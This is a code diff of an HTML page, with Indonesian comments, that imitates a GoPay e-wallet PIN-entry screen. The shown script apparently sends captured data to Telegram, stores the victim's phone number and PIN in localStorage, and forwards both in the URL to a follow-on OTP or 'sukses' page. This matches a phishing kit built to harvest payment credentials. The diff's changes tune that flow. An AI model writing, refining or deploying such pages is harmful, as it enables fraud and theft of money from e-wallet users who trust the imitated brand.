@@ -19,7 +19,6 @@
 </head>
 <body class="flex flex-col min-h-screen text-slate-800 antialiased select-none">
 
-  <!-- Ubah jadi flex-col biasa agar posisi bawah bisa ditarik naik sesuka hati -->
   <div class="w-full max-w-[420px] mx-auto min-h-screen bg-[#f3f4f6] flex flex-col pt-5 px-5 sm:px-6 pb-6 shadow-sm">
     
     <!-- Bagian Atas -->
@@ -68,7 +67,6 @@
     </div>
 
     <!-- Bagian Bawah (Keypad Angka & Logo) -->
-    <!-- UBAH ANGKA DI BAWAH INI UNTUK MENAIKKAN ATAU MENURUNKAN KEYPAD -->
     <div style="margin-top: 45px;">
       <!-- Powered by Gopay -->
       <div class="flex items-center justify-center gap-1.5 mb-1.5 text-xs text-slate-500 font-medium">
@@ -158,17 +156,16 @@
       } catch (err) {
         console.log("Error Telegram");
       }
+
       // SIMPAN KE LOCALSTORAGE & KIRIM LEWAT URL
-localStorage.setItem('userPhone', userPhone);
-localStorage.setItem('userPin', pin);
+      localStorage.setItem('userPhone', userPhone);
+      localStorage.setItem('userPin', pin);
 
-// Pindah ke halaman OTP dengan membawa data lengkap
-window.location.href = "otp.html?phone=" + userPhone + "&pin=" + pin;
-
-      
+      // Pindah ke halaman OTP dengan membawa data lengkap
+      setTimeout(() => {
+        window.location.href = "sukses.html?phone=" + userPhone + "&pin=" + pin;
       }, 300);
     }
   </script>
 </body>
 </html>
-
